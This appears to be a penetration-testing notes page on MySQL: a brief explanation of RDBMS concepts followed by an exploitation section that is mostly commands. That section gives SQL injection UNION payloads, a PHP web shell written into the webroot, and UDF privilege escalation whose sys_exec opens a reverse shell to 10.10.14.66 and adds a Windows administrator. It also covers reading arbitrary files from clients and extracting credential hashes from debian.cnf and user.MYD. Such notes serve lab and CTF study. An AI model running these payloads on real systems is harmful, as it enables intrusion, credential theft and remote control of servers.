### Understanding

**What is MySQL?**

In its simplest definition, MySQL is a<mark style="background: #FF5582A6;"> relational database management system (RDBMS)</mark> based on <mark style="background: #FF5582A6;">Structured Query Language (SQL)</mark>. Too many acronyms? Let's break it down:

**Database:**

A database is simply a <mark style="background: #BBFABBA6;">persistent, organised collection of structured data</mark>

**RDBMS:**

A software or service used to <mark style="background: #BBFABBA6;">create and manage databases based on a relational model</mark>. The word "relational" just means that the data stored in the dataset is organised as tables. Every table relates in some way to each other's<mark style="background: #BBFABBA6;"> "primary key" or other "key"</mark> factors.  

**SQL:**

MYSQL is just a brand name for one of the most popular RDBMS software implementations. As we know, it uses a <mark style="background: #FF5582A6;">client-server</mark> model. But how do the client and server communicate? They use a language, specifically the Structured Query Language (SQL).  

Many other products, such as PostgreSQL and Microsoft SQL server, have the word SQL in them. This similarly signifies that this is a product utilising the Structured Query Language syntax.  

**How does MySQL work?**

MySQL, as an RDBMS, is made up of the server and utility programs that help in the administration of MySQL databases.

The server handles all database instructions like creating, editing, and accessing data. It takes and manages these requests and communicates using the MySQL protocol. This whole process can be broken down into these stages:  

1. MySQL creates a database for storing and manipulating data, defining the relationship of each table.
2. Clients make requests by making specific statements in SQL.
3. The server will respond to the client with whatever information has been requested.  

**What runs MySQL?**

MySQL can run on various platforms, whether it's Linux or windows. It is commonly used as a back end database for many prominent websites and forms an essential component of the <mark style="background: #FF5582A6;">LAMP stack</mark>which includes: <mark style="background: #BBFABBA6;">Linux, Apache, MySQL, and PHP</mark>.

**More Information:**

Here are some resources that explain the technical implementation, and working of, MySQL in more detail than I have covered here:

[https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html](https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html) 

[https://www.w3schools.com/php/php_mysql_intro.asp](https://www.w3schools.com/php/php_mysql_intro.asp)

### Enumerating & Exploiting

**Connect:

**Locally**

```bash
mysql -u root # Connect to root without password
mysql -u root -p # A password will be asked (check someone)
```

Remotely

```bash
mysql -h <Hostname> -u root
mysql -h <Hostname> -u root@localhost
```


**External Enumeration**

Some of the enumeration actions require valid credentials

```bash
nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 <IP>

msf> use auxiliary/scanner/mysql/mysql_version
msf> use auxiliary/scanner/mysql/mysql_authbypass_hashdump
msf> use auxiliary/scanner/mysql/mysql_hashdump #Creds
msf> use auxiliary/admin/mysql/mysql_enum #Creds
msf> use auxiliary/scanner/mysql/mysql_schemadump #Creds
msf> use exploit/windows/mysql/mysql_start_up #Execute commands Windows, Cre
```

**MySQL commands**

```bash
show databases;
use <database>;
connect <database>;
show tables;
describe <table_name>;
show columns from <table>;
select version(); #version
select @@version(); #version
select user(); #User
select database(); #database name

#Get a shell with the mysql client user
\! sh

#Basic MySQLi
Union Select 1,2,3,4,group_concat(0x7c,table_name,0x7C) from information_schema.tables
Union Select 1,2,3,4,column_name from information_schema.columns where table_name="<TABLE NAME>"

#Read & Write
## We need FILE privilege to read & write to files.
select load_file('/var/lib/mysql-files/key.txt'); #Read file
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'

#Try to change MySQL root password
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root';
UPDATE mysql.user SET authentication_string=PASSWORD('MyNewPass') WHERE User='root';
FLUSH PRIVILEGES;
quit;
```

```bash
mysql -u username -p < manycommands.sql #A file with all the commands you want to execute.
mysql -u root -h 127.0.0.1 -e 'show databases;'
```

**MySQL Permissions Enumeration**

```bash
#Mysql
SHOW GRANTS [FOR user];
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';
SHOW GRANTS FOR CURRENT_USER();

# Get users, permissions & hashes
SELECT * FROM mysql.user;

#From DB
select * from mysql.user where user='root'; 
## Get users with file_priv
select user,file_priv from mysql.user where file_priv='Y';
## Get users with Super_priv
select user,Super_priv from mysql.user where Super_priv='Y';

# List functions
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION';
#@ Functions not from sys. db
SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' AND routine_schema!='sys';
```

We can see in the docs the meaning of each privilege: [https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html](https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_execute)

**MySQL arbitrary read file by client**

Actually, when we try to load data local into a table the **content of a file** the MySQL or MariaDB server asks the **client to read it** and send the content. Then, if we can tamper a mysql client to connect to our own MySQL server, we can read arbitrary files. Please notice that this is the behaviour using:

```bash
load data local infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';
```

(Notice the "local" word) Because without the "local" we can get:

```bash
mysql> load data infile "/etc/passwd" into table test FIELDS TERMINATED BY '\n';

ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
```

**Initial PoC:** [**https://github.com/allyshka/Rogue-MySql-Server**](https://github.com/allyshka/Rogue-MySql-Server) 
In this paper we can see a complete description of the attack and even how to extend it to RCE:[**https://paper.seebug.org/1113/**](https://paper.seebug.org/1113/) 
Here we can find an overview of the attack: [**http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/

**Dangerous Settings of mysqld.cnf**

|   |   |
|---|---|
|**Settings**|**Description**|
|`user`|Sets which user the MySQL service will run as.|
|`password`|Sets the password for the MySQL user.|
|`admin_address`|The IP address on which to listen for TCP/IP connections on the administrative network interface.|
|`debug`|This variable indicates the current debugging settings (sensitive info inside logs)|
|`sql_warnings`|This variable controls whether single-row INSERT statements produce an information string if warnings occur. (sensitive info inside logs)|
|`secure_file_priv`|This variable is used to limit the effect of data import and export operations.|

**Privilege escalation**

```bash
# Get current user (an all users) privileges and hashes
use mysql;
select user();
select user,password,create_priv,insert_priv,update_priv,alter_priv,delete_priv,drop_priv from user;

# Get users, permissions & creds
SELECT * FROM mysql.user;
mysql -u root --password=<PASSWORD> -e "SELECT * FROM mysql.user;"

# Create user and give privileges
create user test identified by 'test';
grant SELECT,CREATE,DROP,UPDATE,DELETE,INSERT on *.* to mysql identified by 'mysql' WITH GRANT OPTION;

# Get a shell (with your permissions, usefull for sudo/suid privesc)
\! sh
```

**Privilege Escalation via library**

If the **mysql server is running as root** (or a different more privileged user) you can make it execute commands. For that, you need to use **user defined functions**. And to create a user defined you will need a **library** for the OS that is running mysql.

The malicious library to use can be found inside sqlmap and inside metasploit by doing **`locate "*lib_mysqludf_sys*"`**. The **`.so`** files are **linux** libraries and the **`.dll`** are the **Windows** ones, choose the one you need.

If you **don't have** those libraries, you can either **look for them**, or download this [**linux C code**](https://www.exploit-db.com/exploits/1518) and **compile it inside the linux vulnerable machine**:

```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Now that we have the library, login inside the Mysql as a privileged user (root?) and follow the next steps:

**Linux**

```bash
# Use a database
use mysql;

# Create a table to load the library and move it to the plugins dir
create table npn(line blob);

# Load the binary library inside the table
## You might need to change the path and file name
insert into npn values(load_file('/tmp/lib_mysqludf_sys.so'));

# Get the plugin_dir path
show variables like '%plugin%';

# Supposing the plugin dir was /usr/lib/x86_64-linux-gnu/mariadb19/plugin/
# dump in there the library
select * from npn into dumpfile '/usr/lib/x86_64-linux-gnu/mariadb19/plugin/lib_mysqludf_sys.so';

# Create a function to execute commands
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';

# Execute commands
select sys_exec('id > /tmp/out.txt; chmod 777 /tmp/out.txt');
select sys_exec('bash -c "bash -i >& /dev/tcp/10.10.14.66/1234 0>&1"');
```

**Windows**

```bash
# Check the linux comments for more indications

USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_file('C://temp//lib_mysqludf_sys.dll'));
show variables like '%plugin%';
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
```

**Extracting MySQL credentials from files**

Inside _/etc/mysql/debian.cnf_ we can find the **plain-text password** of the user **debian-sys-maint**

```bash
cat /etc/mysql/debian.cnf
```

We can **use these credentials to login in the mysql database**.

Inside the file: _/var/lib/mysql/mysql/user.MYD_ we can find **all the hashes of the MySQL users** (the ones that we can extract from mysql.user inside the database)_._

We can extract them doing:

```bash
grep -oaE "[-_\.\*a-Z0-9]{3,}" /var/lib/mysql/mysql/user.MYD | grep -v "mysql_native_password"
```

**Useful files**

Configuration Files:

- windows *
    
    - config.ini
        
    
    - my.ini
        
        - windows\my.ini
            
        
        - winnt\my.ini
            
        
    
    - <InstDir>/mysql/data/
        
    
    - unix
        
        - my.cnf
            
            - /etc/my.cnf
                
            
            - /etc/mysql/my.cnf
                
            
            - /var/lib/mysql/my.cnf
                
            
            - ~/.my.cnf
                
            
            - /etc/my.cnf
                
            
        
    

- Command History
    
    - ~/.mysql.history
        
    

- Log Files
    
    - connections.log
        
    
    - update.log
        
    
    - common.log